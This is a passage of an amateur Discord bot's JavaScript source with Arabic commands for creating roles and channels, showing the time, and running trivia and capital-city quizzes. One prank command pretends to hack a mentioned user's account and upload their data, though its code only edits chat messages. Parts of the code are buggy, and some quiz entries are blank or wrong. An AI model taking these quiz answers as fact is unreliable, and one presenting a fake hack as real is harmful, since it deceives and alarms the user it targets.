  color: 'RANDOM',
  position: (1),
  permissions: 'ADMINISTRATOR'
})
message.guild.createRole({ ///by-hosam(galaxy-bot-dev)🚫
    name: 'Prince',
    color: 'RANDOM',
    position: (2),
    permissions: ['CREATE_INSTANT_INVITE', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_CHANNELS', 'ADD_REACTIONS', 'VIEW_AUDIT_LOG', 'VIEW_CHANNEL', 'READ_MESSAGES', 'SEND_MESSAGES',
        'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS',
         'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES'],
})
message.guild.createRole({ ///by-hosam(galaxy-bot-dev)🚫
    name: 'Commander',
    color: 'RANDOM',
     position: (3),
    permissions: ['CREATE_INSTANT_INVITE', 'KICK_MEMBERS', 'ADD_REACTIONS', 'VIEW_CHANNEL', 'READ_MESSAGES', 'SEND_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS',
    'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES']
})
message.guild.createRole({ ///by-hosam(galaxy-bot-dev)🚫
    name: 'Admin',
    color: 'RANDOM',
    postion: (4),
    permissions: ['VIEW_CHANNEL', 'READ_MESSAGES', 'SEND_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS',
    'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME']
})
message.guild.createRole({ ///by-hosam(galaxy-bot-dev)🚫
    name: 'Vip',
    color: 'RANDOM',
    postion: (5),
    permissions: ['VIEW_CHANNEL', 'READ_MESSAGES', 'SEND_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS',
    'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME']
})
message.guild.createRole({ ///by-hosam(galaxy-bot-dev)🚫
    name: 'Active',
    color: '#030303',
    postion: (6),
    permissions: ['VIEW_CHANNEL', 'READ_MESSAGES', 'SEND_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'CONNECT', 'SPEAK',
    'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'ADD_REACTIONS']
})
message.channel.send('**Roles Was Succsesfluy Created**') ///by-hosam(galaxy-bot-dev)🚫
.catch(console.error);
    }
});
client.on('message', message => {
    if (message.content.startsWith("_readyserver")) {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`${message.author.username} You Dont Have ``MANAGE_CHANNELS`` **Premission**`);
     message.guild.createChannel('rules', 'text')
	 message.guild.createChannel('welcome', 'text') ///by-hosam(galaxy-bot-dev)🚫
	 message.guild.createChannel('chat', 'text')
     message.guild.createChannel('youtubers', 'text')
	 message.guild.createChannel('giveaway', 'text') ///by-hosam(galaxy-bot-dev)🚫
	 message.guild.createChannel('shop', 'text')
	 message.guild.createChannel('bot', 'text')
	 


     

message.channel.sendMessage('**Channels Was Succsesfluy Created**')
}
});

client.on('message', message => {
    if (message.content.startsWith("_readyserver")) {
    if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);
message.guild.createChannel('╔╣MUSIC╠╗', 'voice') ///by-hosam(galaxy-bot-dev)🚫
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣Public╠╗', 'voice') ///by-hosam(galaxy-bot-dev)🚫
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣MineCraft╠╗', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣Fortnite╠╗', 'voice') ///by-hosam(galaxy-bot-dev)🚫
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣Call Of Duty╠╗', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣League Of Legends╠╗', 'voice') ///by-hosam(galaxy-bot-dev)🚫
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣Battle Field╠╗', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('╔╣Cs : Go╠╗', 'voice') ///by-hosam(galaxy-bot-dev)🚫
message.guild.createChannel('Talk ◥', 'voice')
message.guild.createChannel('Talk ◥', 'voice')
.catch(console.error);
    }
});



client.on('message', message => {
         if (message.content === "_dt") {
         if (!message.channel.guild) return message.reply('** This command only for servers **');  
         var currentTime = new Date(),
            hours = currentTime.getHours() + 4 ,
            hours2 = currentTime.getHours() + 3 ,
            hours3 = currentTime.getHours() + 2 ,
            hours4 = currentTime.getHours() + 3 ,
            minutes = currentTime.getMinutes(),
            seconds = currentTime.getSeconds(),
            Year = currentTime.getFullYear(),
            Month = currentTime.getMonth() + 1,
            Day = currentTime.getDate();
             var h = hours
  if(hours > 12) {
               hours -= 12;
            } else if(hours == 0) {
                hours = "12";
            }  
             if(hours2 > 12) {
               hours2 -= 12;
            } else if(hours2 == 0) {
                hours2 = "12";
            
            }  
                         if(hours3 > 12) {
               hours3 -= 12;
            } else if(hours3 == 0) {
                hours3 = "12";
            } 
            if (minutes < 10) {
                minutes = '0' + minutes;
            }

            var suffix = 'Morning';
            if (hours >= 12) {
                suffix = 'Evening';
                hours = hours - 12;
            }
            if (hours == 0) {
                hours = 12;
            }
 

                var Date15= new Discord.RichEmbed()
                .setThumbnail("https://i.imgur.com/ib3n4Hq.png") 
                .setTitle( "『Date & Time』")
                .setColor('RANDOM')
                .setFooter(message.author.username, message.author.avatarURL)
                .addField('UAE',
                "『"+ hours + ":" + minutes +":"+ seconds + "』")
                 .addField('KSA',
                "『"+ hours2 + ":" + minutes +":"+ seconds  + "』") 
                .addField('Egypt',
                "『"+ hours3 + ":" + minutes +":"+ seconds  + "』") 
                
                .addField('Date',
                "『"+ Day + "-" + Month + "-" + Year +  "』")

                 message.channel.sendEmbed(Date15);
        }
    });

client.on('message', message => {
var prefix = "_";
var cats = ["http://www.shuuf.com/shof/uploads/2015/09/09/jpg/shof_b9d73150f90a594.jpg","https://haltaalam.info/wp-content/uploads/2015/05/0.208.png","https://haltaalam.info/wp-content/uploads/2015/05/266.png","https://haltaalam.info/wp-content/uploads/2015/05/250.png","https://haltaalam.info/wp-content/uploads/2017/02/0.2517.png","https://pbs.twimg.com/media/CP0mi02UAAA3U2z.png","http://www.shuuf.com/shof/uploads/2015/08/31/jpg/shof_3b74fa7295ec445.jpg","http://www.shuuf.com/shof/uploads/2015/08/22/jpg/shof_fa3be6ab68fb415.jpg","https://pbs.twimg.com/media/CSWPvmRUcAAeZbt.png","https://pbs.twimg.com/media/B18VworIcAIMGsE.png"]
        var args = message.content.split(" ").slice(1);
    if(message.content.startsWith(prefix + 'هل تعلم')) {
         var cat = new Discord.RichEmbed()
.setImage(cats[Math.floor(Math.random() * cats.length)])
message.channel.sendEmbed(cat);
    }
});


client.on('message', message => {
var prefix = "_";
var cats = ["http://palestine-kitchen.ps/wp-content/uploads/2017/12/%D9%86%D9%83%D8%AA-%D8%AF%D8%A8%D8%A7%D9%86%D8%A9.png","http://www.i7lm.com/wp-content/uploads/2017/04/136769797816.jpg","https://4.bp.blogspot.com/-p62zmDIDXmI/WKzqNt9smaI/AAAAAAAAC4Q/sW_bSIB8OaQhwOYFeplc3uzz8PBN7l3YACEw/s1600/13602501135.jpg","https://www.universemagic.com/images/2016/03/7938-2-or-1457539273.jpg","https://1.bp.blogspot.com/-yFk-FzHSyE8/WR9fmPcsCUI/AAAAAAAAE6c/AmvjLadOiLY9GiCqMLHgA121bY2RS_dCwCLcB/s1600/%25D9%2586%25D9%2583%25D8%25AA%2B%25D9%2585%25D8%25B6%25D8%25AD%25D9%2583%25D8%25A9%2B1.jpg","https://l7zaat.com/wp-content/uploads/2018/02/423.jpg","https://www.petfinder.com/wp-content/uploads/2012/11/101438745-cat-conjunctivitis-causes.jpg","https://i.fatafeat.com/storage/attachments/15/image3_698123_large.jpg","http://www.shuuf.com/shof/uploads/2018/02/08/jpg/shof_97d686082bdb0a2.jpg"];
        var args = message.content.split(" ").slice(1);
    if(message.content.startsWith(prefix + 'نكت')) {
         var cat = new Discord.RichEmbed()
.setImage(cats[Math.floor(Math.random() * cats.length)])
message.channel.sendEmbed(cat);
    }
});


client.on('message', message => { 
    if (message.content.startsWith("_تهكير")) {
  if(!message.channel.guild) return message.reply(' ');
      if (message.author.bot) return
           message.delete();
             let args = message.content.split(' ').slice(1);
                   let virusname = args.join(' ');
                 if (virusname < 1) {
                     return message.channel.send("** رجائاََ منشن من تريد تهكيره ** ");
                                     }
                 message.channel.send({embed: new Discord.RichEmbed().setTitle('Loading ' + virusname + "...").setColor(0xFF0000)}).then(function(m) {
             setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle(`** Loading  [▓] 1%**`).setColor(0xFF0000)})
             }, 5500) 
             setTimeout(function() {
                m.edit({embed: new Discord.RichEmbed().setTitle(`** Loading [▓▓▓▓] 25%**`).setColor(0xFF0000)})
              }, 10500)
              setTimeout(function() {
                 m.edit({embed: new Discord.RichEmbed().setTitle(`** Loading [▓▓▓▓▓▓▓▓] 50%**`).setColor(0xFF0000)})
               }, 15500)
               setTimeout(function() {
                  m.edit({embed: new Discord.RichEmbed().setTitle(`** Loading [▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 75%**`).setColor(0xFF0000)})
                }, 25500)
           setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle(`** Hacking Done [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%**`).setColor(0xFF0000)})
             }, 30500)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle(`** ..يتم الدخول للحساب** `).setColor(0xFF0000)})
             }, 40500)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle(`** ..يتم حفظ بيانات الحساب** `).setColor(0xFF0000)})
             }, 45500)
                setTimeout(function() {
               m.edit({embed: new Discord.RichEmbed().setTitle(`** ..يتم رفع البيانات** `).setColor(0xFF0000)})
             }, 50500)
              setTimeout(function() {
               m.delete()
           }, 55000)
             setTimeout(function() {
               message.channel.send('** تم الاختراق  __Done Hacking__ **').then(msg => msg.delete(25000));
           }, 60500)
           });
         }
 });


var juliaan = ["https://f.top4top.net/p_682it2tg6.png","https://e.top4top.net/p_682a1cus5.png","https://d.top4top.net/p_682pycol4.png","https://c.top4top.net/p_682vqehy3.png","https://b.top4top.net/p_682mlf9d2.png","https://a.top4top.net/p_6827dule1.png","https://b.top4top.net/p_682g1meb10.png","https://a.top4top.net/p_682jgp4v9.png","https://f.top4top.net/p_682d4joq8.png","https://e.top4top.net/p_6828o0e47.png","https://d.top4top.net/p_6824x7sy6.png","https://c.top4top.net/p_682gzo2l5.png","https://b.top4top.net/p_68295qg04.png","https://a.top4top.net/p_682zrz6h3.png","https://f.top4top.net/p_6828vkzc2.png","https://e.top4top.net/p_682i8tb11.png"]
var julian = ["📙__60%__  **|**  📘__40%__","📙__63%__  **|**  📘__37%__","📙__89%__  **|**  📘__11%__","📙__97%__  **|**  📘__3%__"]
client.on('message', message => {
    if(!message.guild) return;
    if (message.author.bot) return;
      let id = message.author.id,prefix="-";//البريفكس
      if (ti[id] && (new Date).getTime() - ti[id] < 20*1000) {
          let r = (new Date).getTime() - ti[id];
          r = 20*1000 - r;
      message.channel.send(` **Please wait ${pretty(r, {verbose:true})}**`).then(m => m.delete(5000));
      return;
      }
      if ( message.content == prefix+'لو خيروك'){
         
          try{
  
  }catch(e){
 
  }
         var Embed = new Discord.RichEmbed()
.setImage(juliaan[Math.floor(Math.random() * juliaan.length)])
message.channel.sendEmbed(Embed).then(msg => {
    msg.react('📘').then( r => {
        msg.react('📙')
 
        let blueFilter = (reaction, user) => reaction.emoji.name === '📘' && user.id === message.author.id;
    let orangeFilter = (reaction, user) => reaction.emoji.name === '📙' && user.id === message.author.id;
 
 
    let blue = msg.createReactionCollector(blueFilter, { time: 15000 });
    let orange = msg.createReactionCollector(orangeFilter, { time: 15000 });
 
 
    blue.on("collect", r => {
        msg.delete();
        message.channel.send(julian[Math.floor(Math.random() * julian.length)]).then(m => m.delete(60000));
 
        })
       
 orange.on("collect", r => {
        msg.delete();
        message.channel.send(julian[Math.floor(Math.random() * julian.length)]).then(m => m.delete(60000));
 
        })
 
                                })
                                })
                              ti[id] = (new Date).getTime()
                                }
                                });


const cuttweet = [     'كت تويت ‏| تخيّل لو أنك سترسم شيء وحيد فيصبح حقيقة، ماذا سترسم؟',     'كت تويت | أكثر شيء يُسكِت الطفل برأيك؟',     'كت تويت | الحرية لـ ... ؟',     'كت تويت | قناة الكرتون المفضلة في طفولتك؟',     'كت تويت ‏| كلمة للصُداع؟',     'كت تويت ‏| ما الشيء الذي يُفارقك؟',     'كت تويت ‏| ما الشيء الذي يُفارقك؟',     'كت تويت | ��وقف مميز فعلته مع شخص ولا يزال يذكره لك؟',     'كت تويت ‏| أيهما ينتصر، الكبرياء أم الحب؟',     'كت تويت | بعد ١٠ سنين ايش بتكون ؟',     'كت تويت ‏| مِن أغرب وأجمل الأسماء التي مرت عليك؟',     '‏كت تويت | عمرك شلت مصيبة عن ش��������ص برغبتك ؟',     'كت تويت | أكثر سؤال وجِّه إليك مؤخرًا؟',     '‏كت تويت | ما هو الشيء الذي يجعلك تشعر بالخوف؟',     '‏كت تويت | وش يفسد الصداقة؟',     '‏كت تويت | شخص لاترفض له طلبا ؟',     '‏كت تويت | كم مره خسرت شخص تحبه؟.',     '‏كت تويت | كيف تتعامل مع الاشخاص السلبيين ؟',     '‏كت تويت | كلمة تشعر بالخجل اذا قيلت لك؟',     '‏كت تويت | جسمك اكبر من عٌمرك او العكسّ ؟!',     '‏كت تويت |أقوى كذبة مشت عليك ؟',     '‏كت تويت | تتأثر بدموع شخص يبكي قدامك قبل تعرف السبب ؟',     'كت تويت | هل حدث وضحيت من أجل شخصٍ أحببت؟',     '‏كت تويت | أكثر تطبيق تستخدمه مؤخرًا؟',     '‏كت تويت | ‏اكثر شي يرضيك اذا زعلت بدون تفكير ؟',     '‏كت تويت | وش محتاج عشان تكون مبسوط ؟',     '‏كت تويت | مطلبك الوحيد الحين ؟',     '‏كت تويت | هل حدث وشعرت بأنك ارتكبت أحد الذنوب أثناء الصيام؟',];
 client.on('message', message => {
	   var prefix = "_";
   if (message.content.startsWith(prefix + "كت تويت")) {
                if(!message.channel.guild) return message.reply('** This command only for servers**');
  var embed = new Discord.RichEmbed()
  .setColor('RANDOM')
   .setThumbnail(message.author.avatarURL) 
 .addField('Amaterasu Bot' ,
  `${cuttweet[Math.floor(Math.random() * cuttweet.length)]}`)
  message.channel.sendEmbed(embed);
    }
});	


client.on('message', message => {
    if (message.content == "_quas") {
         message.react('🤔','👌')
        var x = ['اين يلعب مصطفي فتحي؟', 'ما هو اسم ملعب بارشالونة', 'ما هو يوم الحج الأكبر؟', 'ما هو أطول أنهار أوربا ؟', 'ما هو اسم بيت الدجاج', 'ما هو أول بنك قام بالنشاط المصرفي في السعودية عام 1926م' , 'ما هو أول جامع أقيم في مصر','ما هو أطول نهر في آسيا','ما هو أقرب كوكب إلى الشمس','ما هو الحيوان الذي يُسمى البهنس','ما هو اول مسجد أسس بالمدينة','متى وقع صلح الحديبية عام 6هـ او 3هـ او 2هـ؟','متى قامت أمريكا بأول رحلة فضائية','متى كانت غزوة خيبر؟','ما هي السورة التي تبدأ بقوله تعالى " يا أيها النبي اتق الله ولا تطع الكافرين والمنافقين إن الله كان عليما حكيما ".اجب؟','ما هي السورة التي يطلق عليها عروس القرآن','ماذا يسمى من لايقرأ ولايكتب','ماهي أول دولة استخدمت طابع البريد','ماهو شعار الولايات المتحدة الامريكية','ماهو اذكي الحيوانات','من هو مكتشف أمريكا','مامعنى "فرعون" اجب؟','ماهو اقرب كوكب إلى الارض','ما هي نسبه المياه من الكره الارضيه?','كم عدد السجدات في القرآن الكريم؟','من هو بطل كاس العالم في عام 1966','أين أفتتح اول متحف في العالم?','ماأسم أنثى الحمار?','كم تبلغ درجه حراره الشمس؟','من هي مدينة الضباب','أين توجد أطول سكة حديد في العالم?'
        ];
        var x2 = ['التعاون', 'كامب نو', 'يوم النحر', 'الدانوب', 'قن', 'البنك الهولندي', 'جامع عمرو بن العاص','اليانجستي','عطارد','الاسد','مسجد قباء','6','سنة 1962','عام 7هـ','الاحزاب','سورة الرحمن','امي','بريطانيا','النسر الاصلع','الدلفين','كولمبس','البيت الكبير','الزهره','71%','15 سجدة','انكلترا ','القاهرة','الاتان','15 مليون درجه مئوية','لندن','كندا'
        ];
	    var x3 = Math.floor(Math.random()*x.length)
        message.channel.send(`📢 امامك دقيقة لحل الاسئلة , السؤال يقول :  __**${x[x3]}**__ `).then(msg1=> {
            var r = message.channel.awaitMessages(msg => msg.content == x2[x3], {
               thing: true,
               maxMatches : 1,
                time : 60000,
                 maxUses: 1,
                errors : ['time']
            })
        r.catch(() => {
            return message.channel.send(`:negative_squared_cross_mark: لقد انتهى الوقت ولم يقم أحد بالأجابة بشكل صحيح `)
        })

        r.then((collected)=> {
            message.channel.send(`${collected.first().author} لقد قمت بكتابة الجواب الصحيح  `);
            message.react('✅')
        })
        })
    }
});


client.on('message', message => {
    if (message.content.startsWith(prefix + "bot")) {
    message.channel.send({
        embed: new Discord.RichEmbed()
            .setAuthor(client.user.username,client.user.avatarURL)
            .setThumbnail(client.user.avatarURL)
            .setColor('RANDOM')
            .setTitle('``INFO Amaterasu Bot`` ')
            .addField('``Uptime``', [timeCon(process.uptime())], true)
            .addField('``My Ping``' , [`${Date.now() - message.createdTimestamp}` + 'MS'], true)
            .addField('``RAM Usage``', `[${(process.memoryUsage().rss / 1048576).toFixed()}MB]`, true)
            .addField('``servers``', [client.guilds.size], true)
            .addField('``channels``' , `[ ${client.channels.size} ]` , true)
            .addField('``Users``' ,`[ ${client.users.size} ]` , true)
            .addField('``My Name``' , `[ ${client.user.tag} ]` , true)
            .addField('``My ID``' , `[ ${client.user.id} ]` , true)
                  .addField('``My Prefix``' , `-` , true)
                  .addField('``My Language``' , `[ Java Script ]` , true)
                  .setFooter('By | Minato')
    })
}
});


    client.on("message", async message => {
 var prefix = "_";
 var aoasm =[
     {q:"ما عاصمة **المغرب**",a:"الرباط"},
     {q:"ما عاصمة **افغانستان**",a:"كبل"},
     {q:"ما عاصمة ** البانيا**",a:"تيران"},
     {q:"ما عاصمة **الجزائر **",a:"الجزائر"},
     {q:"ما عاصمة ** **",a:"الجزائر"},
     {q:"ما عاصمة **اندورا لا فيلا **",a:"اندورا"},
     {q:"ما عاصمة **انجولا**",a:"لواندا"},
     {q:"ما عاصمة **انتيجوا وباربودا**",a:"سان جونز"},
     {q:"ما عاصمة **الارجنتين**",a:"بوينس ايرس"},
     {q:"ما عاصمة **ارمينيا**",a:"يريفان"},
     {q:"ما عاصمة ** مصر**",a:"القاهرة"},
     {q:"ما عاصمة ** استراليا**",a:"كانبرا"},
     {q:"ما عاصمة **النمسا**",a:"فيينا"},
     {q:"ما عاصمة ** اذربيجان**",a:"باكو"},
     {q:"ما عاصمة **جزر البهاما**",a:"ناساو"},
     {q:"ما عاصمة **البحرين**",a:"المنامة"},
     {q:"ما عاصمة ** بنجلاد��ش**",a:"دكـا"},
     {q:"ما عاصمة **باربادوس **",a:"بريدجتاون"},
     {q:"ما عاصمة **بيلا روسيا**",a:"مينسك"},
     {q:"ما عاصمة ** بلجيكا**",a:"بروكسل"},
     {q:"ما عاصمة ** بيليز**",a:"بلوم بان"},
     {q:"ما عاصمة ** بنين**",a:"بورتو نوفو"},
     {q:"ما عاصمة ** بوتان**",a:"ثيمفو"},
     {q:"ما عاصمة **بوليفيا **",a:"لاباز"},
     {q:"ما عاصمة ** البوسنة والهرسك**",a:"سراييفو"},
     {q:"ما عاصمة ** بوتسوانا**",a:"جابورون"},
     {q:"ما عاصمة ** البرازيل**",a:"برازيليا"},
     {q:"ما عاصمة ** بروناى**",a:"بندر سرى بيجاوان"},
     {q:"ما عاصمة ** بلغاريا**",a:"صوفيا"},
     {q:"ما عاصمة ** بوركينا فاسو**",a:"واجادوجو"},
     {q:"ما عاصمة **بوروندى **",a:"بوجومبورا"},
     {q:"ما عاصمة **كمبوديا **",a:"بنوم بنـه"},
     {q:"ما عاصمة ** الكاميرون**",a:"ياوندى"},
     {q:"ما عاصمة ** كندا**",a:"اوتاوا"},
     {q:"ما عاصمة ** الرأس الاخضر**",a:"برايا"},
     {q:"ما عاصمة **تشاد **",a:"نجامينا"},
     {q:"ما عاصمة ** شيلى**",a:"سانتياجو"},
     {q:"ما عاصمة **الصين **",a:"بكين"},
     {q:"ما عاصمة ** **",a:"مورونى"},
     {q:"ما عاصمة **كوستاريكا **",a:"سان خوسيه"},
     {q:"ما عاصمة ** كوت ديفوار**",a:"ابيدجان"},
     {q:"ما عاصمة **كرواتيا **",a:"زغرب"},
     {q:"ما عاصمة ** كوبا**",a:"هافانا"},
     {q:"ما عاصمة ** قبرص**",a:" "},
     {q:"ما عاصمة ** جمهورية التشيك**",a:"براغ"},
     {q:"ما عاصمة **الدنمارك **",a:"كوبنهاجن"},
     {q:"ما عاصمة ** جيبوتى**",a:"جيبوتى"},
     {q:"ما عاصمة ** دومينيكا**",a:"روسيو"},
     {q:"ما عاصمة **الدومينيكان **",a:"سان دومينجو"},
     {q:"ما عاصمة **تيمور الشرقية **",a:"ديلى"},
     {q:"ما عاصمة **قطر  **",a:"الدوحة"},
     {q:"ما عاصمة **السعودية  **",a:"الرياض"},
     {q:"ما عاصمة **سوريا  **",a:"دمشق"},
     {q:"ما عاصمة **تركيا  **",a:"انقرة"},
     {q:"ما عاصمة **العراق  **",a:"بغداد"},
     {q:"ما عاصمة **البنان  **",a:"بيروت"},
     {q:"ما عاصمة **فلسطين  **",a:"القدس"},
     {q:"ما عاصمة **امريكا  **",a:"واشنطن"},
     {q:"ما عاصمة **الاردن  **",a:"عمان"},    
     {q:"ما عاصمة **السودان  **",a:"خرطوم"},
     {q:"ما عاصمة **الما��يا  **",a:"برلين"},
     {q:"ما عاصمة **كندا  **",a:"اوتاوا"},
     {q:"ما عاصمة **البرازيل  **",a:"برازيليا"},
    ];
     if(message.content == prefix+"عواصم"){
         if(UserBlocked.has(message.guild.id)) return message.channel.send("هناك جلسة .")
         UserBlocked.add(message.guild.id)
         var ask = aoasm[Math.floor(Math.random() * aoasm.length)];
         let embed = new Discord.RichEmbed()
         .setTitle('سؤال عواصم')
         .setAuthor(message.author.username, message.author.avatarURL)
         .setColor("RANDOM")
         .setDescription(ask.q);
         message.channel.sendEmbed(embed).then(msg=> msg.delete(20000))
         const msgs = await message.channel.awaitMessages(msg => msg.author.id !== client.user.id ,{maxMatches:1,time:10000});
             UserBlocked.delete(message.guild.id)
         msgs.forEach(result => {
            if(result.author.id == client.user.id) return;
            if(result.content == "عاصمة") return
            if(result.content == ask.a){
              let embeds = new Discord.RichEmbed()
              .setTitle(':white_check_mark: اجابة صحيحة')
              .setAuthor(message.author.username, message.author.avatarURL)
              .setColor("RANDOM")
              .setDescription(`**${result.author.username}** الإجابة صحيحة`);
                 message.channel.sendEmbed(embeds);                return;
            } else {
 
                                   var embedx = new Discord.RichEmbed()
                 .setTitle(':x:خطاء')
                 .setAuthor(message.author.username, message.author.avatarURL)
                 .setColor("RANDOM")
                 .setDescription(`**${result.author.username}** الإجابة خاطئة`);
                 message.channel.sendEmbed(embedx);
            }
      });
   }
 });


 let points = {};
 const type = [
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429298994078810127/a90c6b270eb8bb2e.png",
         "answers": ["البرازيل"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429298996385677312/93b0c6f963ca78cc.png",
         "answers": ["السعودية"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429298996130086934/341960d3e3e1daad.png",
         "answers": ["القسطنطينية"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429298998172450816/5c70f0d2a02f741a.png",
         "answers": ["النهاية"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429298999799971860/00c3e44857da1d4f.png",
         "answers": ["امازون"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429299000026595338/56ca5f3803361aaf.png",
         "answers": ["جافاسكربت"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429299000676581382/426f82fc46406cf9.png",
         "answers": ["سهله مو صعبه"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429299005474996255/7ec6030fe3423458.png",
         "answers": ["طبق رطب مرق بقر"]
     },
     {
             "type": "https://cdn.discordapp.com/attachments/429298913980317696/429299005458087936/fd790725b7496d35.png",
         "answers": ["متجر"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330177894645780/7a11f3f73c1df90d.png",
         "answers": ["شجرة الأوغيري"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330188162301952/a5d4f8c72362aa3f.png",
         "answers": ["عش العصفور"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330194587713554/c5b6b7bad08671a9.png",
         "answers": ["قم بكتابة"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330199838982152/1e05423a0b91fdaa.png",
         "answers": ["كانيكي"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330207711690762/39a6a460c6211b5d.png",
         "answers": ["ليوبليانا"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330217971089418/e5e323d8e8ce00ad.png",
         "answers": ["هواوي"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330224316940329/7872c68940fd6f08.png",
         "answers": ["ياخرا"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330229140652032/2419fe025b8b35f2.png",
         "answers": ["يوم الخميس"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330238330241044/DO_YOU_KNOW_THE_WAY.png",
         "answers": ["DO YOU KNOW THE WAY"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330246840483842/23dc3a67e7bedc9e.png",
         "answers": ["الأرض"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330256256827414/9f90c0fcbfc60a0d.png",
         "answers": ["البوابة"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330261663285259/0e41e6dcefc80cd3.png",
         "answers": ["الجمل ابو راسين"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330264901287946/6459ace62733c477.png",
         "answers": ["الحوت الأزرقء"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330272920797226/de084748fdbe524b.png",
         "answers": ["القارب المكسور"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330281372057622/bcae99355befcd06.png",
         "answers": ["المدرسة"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330289769054230/c030902a9d21637c.png",
         "answers": ["اليابان"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330298585481218/2ca3d0f29283cced.png",
         "answers": ["بلايستايشن"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330311558725632/6dc92ab82d3df0e4.png",
         "answers": ["جزر القمر"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429330312842182657/f50f4fab4b6559c0.png",
         "answers": ["حشيش"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429932988625584139/3333333.png",
         "answers": ["سوبراشي"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429932994351071233/3333333.png",
         "answers": ["قوتشي"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933002399940609/3333333.png",
         "answers": ["ايفون"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933012164149249/3333333.png",
         "answers": ["تيستا لاغوسا"]
  
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933033009840129/3333333.png",
         "answers": ["بسكوت ابو ولد"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933041033674753/3333333.png",
         "answers": ["تكأكأتم"]
           },
     {
             "type": "https://cdn.discordapp.com/attachments/429330153735454722/429933050139246592/3333333.png",
         "answers": ["الجملة المفيدة"]
           },
     {
